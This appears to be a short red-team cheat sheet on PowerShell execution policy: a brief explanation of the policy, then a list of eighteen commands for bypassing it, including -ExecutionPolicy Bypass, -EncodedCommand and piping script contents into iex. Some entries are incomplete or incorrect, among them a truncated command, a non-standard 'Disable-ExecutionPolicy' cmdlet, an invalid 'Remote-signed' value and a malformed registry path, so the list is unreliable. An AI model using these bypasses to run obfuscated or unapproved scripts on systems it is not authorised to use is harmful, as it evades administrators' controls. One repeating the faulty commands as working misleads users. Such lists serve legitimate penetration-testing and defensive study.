Powershell modules and commands that come in handy for pentests and red team assessments. 

## What is PowerShell Execution Policy?
PowerShell execution policies let you determine the conditions under which PowerShell loads configuration files and runs scripts.
You can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policy for computers and users.
Execution policies for the local computer and current user are stored in the registry. You do not need to set execution policies in your PowerShell profile. The execution policy for a particular session is stored only in memory and is lost when the session is closed.
The execution policy is not a security system that restricts user actions. For example, users can easily circumvent a policy by typing the script contents at the command line when they cannot run a script. Instead, the execution policy helps users to set basic rules and prevents them from violating them unintentionally.

## Know your current execution policy
Fire up powershell.exe and type in:

`Get-ExecutionPolicy -List`

## Bypassing PowerShell Execution Policy
To bypass the Execution Policy fire in the following commands:

1. PowerShell.exe -noprofile -
2. powershell -nop
3. Powershell -command "Command"
4. Powershell -c
5. powershell.exe -EncodedCommand $EncodedCommand
6. invoke-command -scriptblock {Command}
7. invoke-command -computername Computername -scriptblock {get-executionpolicy} | set-executionpolicy -force
8. Get-Content .powershellfile.ps1 | Invoke-Expression
9. GC .powershellfile.ps1 | iex
10. PowerShell.exe -ExecutionPolicy Bypass
11. PowerShell.exe -ExecutionPolicy UnRestricted
12. PowerShell.exe -ExecutionPolicy Remote-signed
13. Disable-ExecutionPolicy
14. Powershell.exe Set-ExecutionPolicy Bypass
15. Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
16. Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
17. Powershell.exe -Exec Bypass
18. Changing the Registry : HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
